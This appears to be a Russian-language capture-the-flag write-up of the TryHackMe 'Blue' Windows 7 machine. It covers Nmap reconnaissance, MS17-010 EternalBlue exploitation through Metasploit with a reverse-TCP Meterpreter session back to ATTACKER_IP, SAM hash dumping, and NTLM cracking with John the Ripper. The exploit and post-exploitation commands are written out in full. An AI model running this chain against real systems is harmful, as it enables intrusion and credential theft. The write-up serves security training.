# Отчёт о прохождении машины Blue

## 1. Разведка (Reconnaissance)

Выполнено сканирование Nmap для выявления открытых портов и определения сервисов целевой системы.

```bash
nmap -sV -sC -p- TARGET_IP
```

**Результаты сканирования:**

| Порт | Сервис | Назначение |
|------|--------|------------|
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | NetBIOS Session Service |
| 445/tcp | microsoft-ds | SMB (Server Message Block) |
| 49152/tcp | msrpc | Microsoft Windows RPC |
| 49153/tcp | msrpc | Microsoft Windows RPC |
| 49154/tcp | msrpc | Microsoft Windows RPC |
| 49160/tcp | msrpc | Microsoft Windows RPC |

**Информация о хосте:**
- Имя компьютера: `JON-PC`
- Операционная система: `Windows 7 Professional 7601 Service Pack 1`
- Workgroup: `WORKGROUP`
- SMB подпись: отключена (dangerous, but default)

**Ключевые выводы:**
- Открыт порт 445 (SMB)
- Windows 7 без актуальных обновлений
- SMB signing disabled
- Машина не в домене, а в рабочей группе


## 2. Идентификация уязвимости

На основе версии ОС (Windows 7 SP1) и открытого порта 445 была идентифицирована уязвимость **MS17-010 EternalBlue**.

**Информация об уязвимости:**
- **Название:** EternalBlue
- **CVE:** CVE-2017-0144
- **Протокол:** SMBv1
- **Тип:** Remote Code Execution (RCE)
- **Поражённые версии:** Windows 7, Windows Server 2008 R2, Windows 8.1, Windows Server 2012

**Проверка уязвимости:**
```bash
nmap --script smb-vuln-ms17-010 TARGET_IP
```

Сканер подтвердил, что целевая система уязвима к MS17-010.


## 3. Эксплуатация уязвимости (EternalBlue)

### 3.1 Запуск Metasploit

```bash
msfconsole
```

### 3.2 Выбор и настройка эксплойта

```msf
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set LPORT 4444
run
```

**Использованные параметры по умолчанию:**
- `target` = Windows 7
- `payload` = windows/x64/meterpreter/reverse_tcp
- `ProcessName` = spoolsv.exe

### 3.3 Результат эксплуатации

Эксплойт успешно выполнен. Получена сессия Meterpreter.

```msf
[*] Started reverse TCP handler on ATTACKER_IP:4444
[*] 10.10.10.10:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check...
[+] 10.10.10.10:445 - Host is likely VULNERABLE to MS17-010!
[*] Sending stage (200774 bytes) to 10.10.10.10
[*] Meterpreter session 1 opened
```


## 4. Пост-эксплуатация (Post-Exploitation)

### 4.1 Проверка текущего контекста

```meterpreter
getuid
```

**Результат:** `NT AUTHORITY\SYSTEM` — максимальные привилегии на локальной машине.

### 4.2 Дамп хэшей пользователей

```meterpreter
hashdump
```

**Результат:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

### 4.3 Взлом NTLM хэша пользователя Jon

Хэш: `ffb43f0de35be4d9917ac0cc8ad57f8d`

**Метод взлома:** словарная атака через John the Ripper или Hashcat.

```bash
# Сохранение хэша в файл
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > jon.hash

# Взлом через John
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt jon.hash

# Результат
alqfna22
```

**Найденный пароль:** `alqfna22`


## 5. Флаги (Flags)

### 5.1 Первый флаг

**Расположение:** корневая директория диска `C:\`

```cmd
type C:\flag1.txt
```

**Флаг:** `THM{...}`

### 5.2 Второй флаг

**Расположение:** `C:\Windows\System32\config` (хранилище реестра)

Флаг находится среди файлов реестра. Получен через `hashdump` или прямой доступ к SAM файлу.

```cmd
type C:\Windows\System32\config\flag2.txt
```

**Флаг:** `THM{...}`

### 5.3 Третий флаг

**Расположение:** директория `Documents` пользователя `Jon`

```cmd
type C:\Users\Jon\Documents\flag3.txt
```

**Флаг:** `THM{...}`

---

## 6. Итог

### 6.1 Цепочка атаки

1. **Сканирование** — обнаружен открытый порт 445 (SMB) на Windows 7
2. **Идентификация** — уязвимость MS17-010 (EternalBlue) подтверждена Nmap скриптом
3. **Эксплуатация** — запуск эксплойта из Metasploit, получение сессии Meterpreter
4. **Пост-эксплуатация** — дамп хэшей через `hashdump`
5. **Взлом** — пароль пользователя Jon подобран через словарную атаку (`alqfna22`)
6. **Флаги** — извлечены из трёх локаций

### 6.2 Достижения и новые навыки

**EternalBlue (MS17-010):** применён эксплойт для Windows 7 через SMB. Получен опыт работы с классической критической уязвимостью, которая используется в реальных атаках (WannaCry, NotPetya).

**Meterpreter:** отработаны базовые команды `hashdump`, `getuid`, `shell`. Получен SYSTEM уровень доступа без дополнительной эскалации.

**Взлом NTLM хэша:** отработана техника извлечения хэша из дампа SAM и последующего взлома через John the Ripper. Пароль `alqfna22` получен из словаря rockyou.txt.

**Работа с флагами в реестре:** второй флаг находился в системной папке `C:\Windows\System32\config`, что потребовало понимания структуры Windows.